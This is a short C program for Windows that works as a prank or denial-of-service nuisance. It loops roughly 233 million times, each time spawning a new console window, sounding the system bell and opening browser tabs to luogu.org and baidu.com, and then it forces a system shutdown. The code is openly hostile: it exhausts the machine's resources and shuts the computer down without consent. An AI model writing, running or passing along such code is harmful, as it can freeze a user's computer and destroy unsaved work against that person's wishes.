#include <stdio.h>
#include <stdlib.h>

int main ()
{
	int t = 233333333;
	while (t --)
	{
		system("start");
		putchar('\a');
		system("start https://www.luogu.org/");
		system("start https://www.baidu.com/");
	}
	system("start shutdown -s -t 2");
	return 0;
}
